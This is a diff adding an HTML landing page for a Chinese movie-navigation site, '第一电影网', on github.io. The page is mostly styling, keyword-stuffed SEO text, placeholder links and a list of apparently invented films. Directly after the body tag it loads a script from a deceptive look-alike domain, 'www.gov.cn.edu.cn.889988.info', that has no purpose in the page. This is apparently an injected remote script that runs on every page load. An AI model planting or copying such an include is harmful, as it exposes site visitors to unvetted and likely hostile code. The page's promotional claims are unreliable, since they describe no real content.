@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>第一电影网 | 第一电影网官网 - 电影在线观看与片单导航（diyidianyingwang-zh.github.io）</title>
+<meta name="description" content="第一电影网（diyidianyingwang-zh.github.io）提供电影在线观看导航、最新影片与经典片单索引。网站名称：第一电影网，网站网址：https://diyidianyingwang-zh.github.io，移动端自适应，栏目清晰。">
+<meta name="keywords" content="第一电影网, diyidianyingwang-zh.github.io, 第一电影网官网, 电影在线观看, 电影导航, 最新电影, 经典电影">
+<meta name="author" content="第一电影网">
+<meta name="robots" content="index,follow">
+<meta name="theme-color" content="#ffffff">
+<link rel="canonical" href="https://diyidianyingwang-zh.github.io/">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+ --ink:#111315;--deep:#2a2f33;--txt:#4b535a;--mute:#8a9299;
+ --line:#d8dcdf;--bg:#ffffff;--bg2:#f5f6f7;--blue:#1640d6;
+}
+html{scroll-behavior:smooth;scroll-padding-top:66px}
+body{font-family:"Helvetica Neue","Arial","PingFang SC","Microsoft YaHei",sans-serif;background:var(--bg);color:var(--txt);line-height:1.7;-webkit-font-smoothing:antialiased}
+a{text-decoration:none;color:inherit}
+:focus-visible{outline:2px solid var(--blue);outline-offset:2px}
+img{max-width:100%;display:block}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px}
+ul{list-style:none}
+
+/* 顶部 */
+header{position:sticky;top:0;z-index:99;background:rgba(255,255,255,.96);border-bottom:1px solid var(--ink)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:64px;gap:20px}
+.brand{display:flex;align-items:baseline;gap:9px;letter-spacing:-.3px}
+.brand b{font-size:20px;font-weight:900;color:var(--ink)}
+.brand i{font-style:normal;font-size:11px;color:var(--mute);font-weight:700;letter-spacing:.3px}
+.links{display:flex;gap:2px;align-items:center}
+.links a{padding:8px 12px;font-size:14px;color:var(--deep);font-weight:600;transition:.18s}
+.links a:hover{color:var(--blue)}
+.links a.cta{border:1.5px solid var(--ink);margin-left:10px;padding:7px 16px}
+.links a.cta:hover{background:var(--ink);color:#fff}
+.mbtn{display:none;background:none;border:0;color:var(--ink);font-size:22px;cursor:pointer;padding:4px}
+
+/* 首屏 */
+.hero{padding:74px 0 60px;border-bottom:2px solid var(--ink)}
+.hero .wrap{display:grid;grid-template-columns:1.35fr 1fr;gap:48px;align-items:end}
+.hero h1{font-size:64px;font-weight:900;line-height:.98;letter-spacing:-2.5px;color:var(--ink);margin-bottom:18px}
+.hero h1 span{color:var(--blue)}
+.hero .lead{font-size:16px;color:var(--txt);max-width:52ch;border-left:3px solid var(--blue);padding-left:16px;margin-bottom:22px}
+.hero .url{font-size:13px;color:var(--mute);letter-spacing:.3px}
+.hero .url b{color:var(--blue);font-weight:800}
+.btns{margin-top:26px;display:flex;gap:12px;flex-wrap:wrap}
+.btn{padding:12px 26px;font-weight:800;font-size:14.5px;transition:.18s;cursor:pointer;display:inline-block}
+.btn-solid{background:var(--ink);color:#fff;border:1.5px solid var(--ink)}
+.btn-solid:hover{background:var(--blue);border-color:var(--blue)}
+.btn-line{background:#fff;color:var(--deep);border:1.5px solid var(--ink)}
+.btn-line:hover{color:var(--blue);border-color:var(--blue)}
+.tile{display:grid;grid-template-columns:1fr 1fr;gap:0;border:2px solid var(--ink)}
+.tile div{padding:20px 18px;border-right:1px solid var(--line);border-bottom:1px solid var(--line)}
+.tile div:nth-child(2n){border-right:0}
+.tile div:nth-last-child(-n+2){border-bottom:0}
+.tile b{display:block;font-size:26px;font-weight:900;color:var(--blue);line-height:1.1}
+.tile span{font-size:12px;color:var(--mute);letter-spacing:.5px}
+
+/* 通用栏目 */
+section{padding:70px 0}
+.sh{margin-bottom:38px}
+.sh .en{font-size:11px;color:var(--blue);font-weight:800;letter-spacing:2px;text-transform:uppercase}
+.sh h2{font-size:30px;font-weight:900;color:var(--ink);margin:5px 0 8px;letter-spacing:-.8px}
+.sh p{color:var(--mute);font-size:14.5px}
+
+/* 频道 */
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border-top:2px solid var(--ink);border-left:2px solid var(--ink)}
+.ch{border-right:2px solid var(--ink);border-bottom:2px solid var(--ink);padding:26px 22px;background:#fff;transition:.2s;display:block}
+.ch:hover{background:var(--ink);color:#fff}
+.ch:hover p,.ch:hover .no{color:#aab2ba}
+.ch .no{font-size:12px;color:var(--mute);font-weight:800;letter-spacing:1px;margin-bottom:14px}
+.ch h4{font-size:18px;font-weight:900;color:var(--ink);margin-bottom:7px;transition:.2s}
+.ch:hover h4{color:#fff}
+.ch p{font-size:13.5px;color:var(--mute);transition:.2s}
+.ch .ar{margin-top:14px;font-size:12px;font-weight:800;color:var(--blue)}
+
+/* 片单 */
+.list{border-top:1px solid var(--ink)}
+.row{display:grid;grid-template-columns:60px 1fr 1.1fr 110px 24px;gap:18px;align-items:center;padding:18px 4px;border-bottom:1px solid var(--line);transition:.18s}
+.row:hover{background:var(--bg2);padding-left:14px}
+.row .n{font-size:13px;font-weight:900;color:var(--mute)}
+.row h4{font-size:16.5px;font-weight:800;color:var(--ink)}
+.row .genre{font-size:13px;color:var(--txt)}
+.row .yr{font-size:13px;color:var(--mute);text-align:right}
+.row .go{text-align:right;color:var(--blue);font-weight:900;opacity:.4;transition:.2s}
+.row:hover .go{opacity:1}
+
+/* 步骤 */
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:2px solid var(--ink)}
+.step{padding:26px 22px;border-right:1px solid var(--line);position:relative;transition:.2s}
+.step:last-child{border-right:0}
+.step:hover{background:var(--bg2)}
+.step .n{font-size:40px;font-weight:900;color:var(--blue);line-height:.9;margin-bottom:14px;letter-spacing:-1.5px}
+.step b{display:block;font-size:16px;font-weight:900;color:var(--ink);margin-bottom:6px}
+.step p{font-size:13.5px;color:var(--mute)}
+
+/* 优势 */
+.adv{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.box{border:1.5px solid var(--ink);padding:24px 22px;background:#fff;transition:.2s}
+.box:hover{border-color:var(--blue)}
+.box h4{font-size:16.5px;font-weight:900;color:var(--ink);margin-bottom:7px}
+.box p{font-size:14px;color:var(--mute)}
+
+/* FAQ */
+.qa{border:2px solid var(--ink);background:#fff}
+.qa details{border-bottom:1px solid var(--line)}
+.qa details:last-child{border-bottom:0}
+.qa summary{cursor:pointer;padding:18px 22px;font-weight:800;list-style:none;display:flex;gap:12px;align-items:flex-start;font-size:15px;color:var(--ink);transition:.18s}
+.qa summary:hover{color:var(--blue)}
+.qa summary::-webkit-details-marker{display:none}
+.qa summary .q{color:var(--blue);font-weight:900;flex:0 0 auto}
+.qa summary:after{content:"＋";color:var(--blue);font-size:17px;margin-left:auto;transition:.25s;flex:0 0 auto}
+.qa details[open] summary:after{transform:rotate(45deg)}
+.qa details p{padding:0 22px 18px 50px;color:var(--txt);font-size:14.5px}
+
+/* CTA */
+.banner{background:var(--ink);color:#fff;padding:40px 44px;display:flex;align-items:center;justify-content:space-between;gap:24px;flex-wrap:wrap}
+.banner h3{font-size:24px;font-weight:900;letter-spacing:-.5px;margin-bottom:6px}
+.banner p{color:#aab2ba;font-size:14px}
+.banner a{background:var(--blue);color:#fff;padding:13px 28px;font-weight:900;white-space:nowrap;transition:.18s}
+.banner a:hover{background:#fff;color:var(--ink)}
+
+/* 页脚 */
+footer{background:var(--bg2);padding:52px 0 22px;border-top:2px solid var(--ink)}
+.foot{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:36px;margin-bottom:28px}
+.foot h4{font-size:15px;font-weight:900;color:var(--ink);margin-bottom:14px}
+.foot p,.foot a{color:var(--mute);font-size:14px}
+.foot a{display:block;padding:4px 0;transition:.18s}
+.foot a:hover{color:var(--blue)}
+.copy{border-top:1px solid var(--line);padding-top:18px;text-align:center;font-size:13px;color:var(--mute)}
+.copy b{color:var(--blue);font-weight:800}
+.top{position:fixed;right:16px;bottom:20px;width:42px;height:42px;background:var(--ink);color:#fff;display:flex;align-items:center;justify-content:center;font-size:16px;z-index:98;opacity:0;pointer-events:none;transition:.3s;font-weight:900}
+.top.show{opacity:1;pointer-events:auto}
+.top:hover{background:var(--blue)}
+
+@media(max-width:960px){
+ .hero .wrap{grid-template-columns:1fr;gap:34px}
+ .hero h1{font-size:50px}
+ .grid,.tile{grid-template-columns:1fr 1fr}
+ .step{grid-column:span 1}
+ .steps{grid-template-columns:1fr 1fr}
+ .adv,.foot{grid-template-columns:1fr 1fr}
+ .row{grid-template-columns:44px 1fr 80px;gap:12px}
+ .row .genre,.row .go{display:none}
+}
+@media(max-width:560px){
+ .mbtn{display:block}
+ .links{display:none;position:absolute;top:64px;left:0;right:0;background:#fff;flex-direction:column;padding:12px 20px;border-bottom:1px solid var(--ink);align-items:stretch}
+ .links.open{display:flex}
+ .links a.cta{margin:8px 0 0;text-align:center}
+ .brand i{display:none}
+ .hero{padding:46px 0 50px}
+ .hero h1{font-size:36px;letter-spacing:-1.2px}
+ .grid,.tile,.adv,.foot{grid-template-columns:1fr}
+ .ch,.step{border-right:0}
+ .steps,.grid{grid-template-columns:1fr}
+ section{padding:50px 0}
+ .sh h2{font-size:23px}
+ .banner{padding:28px 22px}
+ .qa summary{padding:16px}
+ .qa details p{padding:0 16px 16px 16px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header>
+ <div class="wrap nav">
+  <a href="#" class="brand"><b>第一电影网</b><i>diyidianyingwang-zh.github.io</i></a>
+  <button class="mbtn" onclick="document.getElementById('nav').classList.toggle('open')" aria-label="菜单">☰</button>
+  <nav class="links" id="nav">
+   <a href="#home">首页</a><a href="#cat">频道</a><a href="#list">片单</a>
+   <a href="#why">优势</a><a href="#step">观看步骤</a><a href="#qa">常见问题</a>
+   <a href="#step" class="cta">立即观看</a>
+  </nav>
+ </div>
+</header>
+
+<section class="hero" id="home">
+ <div class="wrap">
+  <div>
+   <h1>第一电影网<br>第一时间看<span>好电影</span></h1>
+   <p class="lead">第一电影网（diyidianyingwang-zh.github.io）提供电影在线观看导航、最新影片与经典片单索引，网站名称：第一电影网，网站网址：https://diyidianyingwang-zh.github.io，全站移动端自适应，栏目清晰易用。</p>
+   <div class="url">官方网址：<b>https://diyidianyingwang-zh.github.io</b></div>
+   <div class="btns">
+    <a class="btn btn-solid" href="#list">查看精选片单</a>
+    <a class="btn btn-line" href="#cat">浏览全部频道</a>
+   </div>
+  </div>
+  <div class="tile">
+   <div><b>8</b><span>内容频道</span></div>
+   <div><b>4</b><span>节目类型</span></div>
+   <div><b>24/7</b><span>在线访问</span></div>
+   <div><b>0</b><span>等待加载</span></div>
+  </div>
+ </div>
+</section>
+
+<section id="cat">
+ <div class="wrap">
+  <div class="sh"><div class="en">CATEGORIES</div><h2>频道分类</h2><p>按题材快速定位想看的电影</p></div>
+  <div class="grid">
+   <a class="ch" href="#"><div class="no">CH.01</div><h4>最新电影</h4><p>近期上映与新片速递</p><div class="ar">查看 →</div></a>
+   <a class="ch" href="#"><div class="no">CH.02</div><h4>经典电影</h4><p>影史名作与高分佳作</p><div class="ar">查看 →</div></a>
+   <a class="ch" href="#"><div class="no">CH.03</div><h4>电影剧集</h4><p>国产、欧美、韩剧更新</p><div class="ar">查看 →</div></a>
+   <a class="ch" href="#"><div class="no">CH.04</div><h4>喜剧轻松</h4><p>合家欢与解压短片</p><div class="ar">查看 →</div></a>
+   <a class="ch" href="#"><div class="no">CH.05</div><h4>动作武侠</h4><p>硬派动作与武侠名篇</p><div class="ar">查看 →</div></a>
+   <a class="ch" href="#"><div class="no">CH.06</div><h4>爱情文艺</h4><p>浪漫经典与文艺佳作</p><div class="ar">查看 →</div></a>
+   <a class="ch" href="#"><div class="no">CH.07</div><h4>悬疑犯罪</h4><p>烧脑反转与黑色电影</p><div class="ar">查看 →</div></a>
+   <a class="ch" href="#"><div class="no">CH.08</div><h4>纪录历史</h4><p>人文自然与纪实影像</p><div class="ar">查看 →</div></a>
+  </div>
+ </div>
+</section>
+
+<section id="list" style="background:var(--bg2)">
+ <div class="wrap">
+  <div class="sh"><div class="en">FEATURED</div><h2>精选片单</h2><p>第一电影网精选值得一看的影片索引</p></div>
+  <div class="list">
+   <div class="row"><div class="n">01</div><h4>城市追光者</h4><div class="genre">悬疑 / 犯罪</div><div class="yr">116分钟</div><div class="go">→</div></div>
+   <div class="row"><div class="n">02</div><h4>星海回响</h4><div class="genre">科幻 / 冒险</div><div class="yr">128分钟</div><div class="go">→</div></div>
+   <div class="row"><div class="n">03</div><h4>晚风来信</h4><div class="genre">爱情 / 都市</div><div class="yr">104分钟</div><div class="go">→</div></div>
+   <div class="row"><div class="n">04</div><h4>长街往事 第二季</h4><div class="genre">年代 / 剧情剧集</div><div class="yr">36集</div><div class="go">→</div></div>
+   <div class="row"><div class="n">05</div><h4>周末不下班</h4><div class="genre">喜剧 / 职场</div><div class="yr">98分钟</div><div class="go">→</div></div>
+   <div class="row"><div class="n">06</div><h4>山河食事</h4><div class="genre">纪录片 / 人文</div><div class="yr">8集</div><div class="go">→</div></div>
+  </div>
+ </div>
+</section>
+
+<section id="why">
+ <div class="wrap">
+  <div class="sh"><div class="en">WHY US</div><h2>选择第一电影网</h2><p>为什么把第一电影网作为看片入口</p></div>
+  <div class="adv">
+   <div class="box"><h4>第一时间更新</h4><p>围绕最新电影与经典电影做持续索引，热门新片优先展示，找片不必来回跳转。</p></div>
+   <div class="box"><h4>频道分类清晰</h4><p>喜剧、动作、爱情、悬疑、纪录片等分频道整理，搭配精选片单快速筛选。</p></div>
+   <div class="box"><h4>移动端自适应</h4><p>页面按屏幕宽度自动重排，手机、平板、电脑均能获得一致的浏览体验。</p></div>
+   <div class="box"><h4>轻量可维护</h4><p>单文件静态页面，CSS 与结构内嵌，加载快速，便于部署与长期维护。</p></div>
+  </div>
+ </div>
+</section>
+
+<section id="step" style="background:var(--bg2)">
+ <div class="wrap">
+  <div class="sh"><div class="en">HOW TO</div><h2>在线观看步骤</h2><p>简单四步，开始看电影</p></div>
+  <div class="steps">
+   <div class="step"><div class="n">01</div><b>打开网站</b><p>在浏览器输入第一电影网网址 https://diyidianyingwang-zh.github.io 进入首页。</p></div>
+   <div class="step"><div class="n">02</div><b>选择频道</b><p>从频道分类进入最新电影、经典电影或电影剧集频道。</p></div>
+   <div class="step"><div class="n">03</div><b>查找影片</b><p>浏览精选片单或按题材筛选，定位想看的电影。</p></div>
+   <div class="step"><div class="n">04</div><b>点播观看</b><p>点击影片入口进入详情，跟随指引开始在线观看。</p></div>
+  </div>
+ </div>
+</section>
+
+<section id="qa">
+ <div class="wrap">
+  <div class="sh"><div class="en">FAQ</div><h2>常见问题</h2><p>关于第一电影网的高频疑问</p></div>
+  <div class="qa">
+   <details open><summary><span class="q">Q.</span>第一电影网的网站名称与官方网址是什么？</summary><p>网站名称：第一电影网；官方网址：https://diyidianyingwang-zh.github.io。建议在浏览器收藏夹中保存该地址，便于随时访问。</p></details>
+   <details><summary><span class="q">Q.</span>第一电影网主要收录哪些内容？</summary><p>第一电影网（diyidianyingwang-zh.github.io）主要收录最新电影、经典电影、电影剧集、喜剧、动作、爱情、悬疑与纪录片索引，服务各类看片需求。</p></details>
+   <details><summary><span class="q">Q.</span>网站支持手机端浏览吗？</summary><p>支持。本站采用移动端自适应设计，页面会根据屏幕宽度自动重排布局，手机、平板、电脑均可正常访问。</p></details>
+   <details><summary><span class="q">Q.</span>片单多久更新一次？</summary><p>精选片单按内容节奏持续更新，保持分类入口与推荐索引的时效性。</p></details>
+   <details><summary><span class="q">Q.</span>内页链接现在可以点击吗？</summary><p>当前内页链接统一使用 # 作为占位符，正式上线后替换为实际页面路径即可正常跳转进入对应栏目。</p></details>
+   <details><summary><span class="q">Q.</span>如何有利于搜索引擎收录？</summary><p>保持页面结构规范、内容完整、内部链接可抓取，并在搜索引擎站长平台提交网站即可。本站未附带 robots.txt 与 sitemap.xml，可按需自行创建。</p></details>
+  </div>
+  <div class="banner" style="margin-top:42px">
+   <div><h3>第一电影网 · 第一时间看电影</h3><p>网站名称：第一电影网 ｜ 网站网址：https://diyidianyingwang-zh.github.io ｜ 长久在线，持续更新</p></div>
+   <a href="#list">查看精选片单</a>
+  </div>
+ </div>
+</section>
+
+<footer>
+ <div class="wrap">
+  <div class="foot">
+   <div><h4>第一电影网 · diyidianyingwang-zh.github.io</h4><p>第一电影网提供最新电影、经典电影与电影剧集的在线观看导航，分类清晰、栏目齐全，随时随地轻松找片。</p></div>
+   <div><h4>快捷导航</h4><ul><li><a href="#home">网站首页</a></li><li><a href="#cat">频道分类</a></li><li><a href="#list">精选片单</a></li><li><a href="#step">观看步骤</a></li></ul></div>
+   <div><h4>内容频道</h4><ul><li><a href="#">最新电影</a></li><li><a href="#">经典电影</a></li><li><a href="#">电影剧集</a></li><li><a href="#">喜剧动作</a></li></ul></div>
+   <div><h4>帮助中心</h4><ul><li><a href="#step">观看步骤</a></li><li><a href="#qa">常见问题</a></li><li><a href="#">意见反馈</a></li><li><a href="#">关于我们</a></li></ul></div>
+  </div>
+  <div class="copy">© 2026 第一电影网（diyidianyingwang-zh.github.io）. 网站名称：第一电影网 ｜ 网站网址：<b>https://diyidianyingwang-zh.github.io</b> ｜ 本站为单文件静态页面，CSS 与结构全部内嵌。</div>
+ </div>
+</footer>
+
+<a href="#" class="top" id="top" aria-label="返回顶部">↑</a>
+<script>
+var t=document.getElementById('top');
+window.addEventListener('scroll',function(){t.classList.toggle('show',window.scrollY>400);});
+document.querySelectorAll('.links a').forEach(function(a){a.addEventListener('click',function(){document.getElementById('nav').classList.remove('open');});});
+</script>
+</body>
+</html>
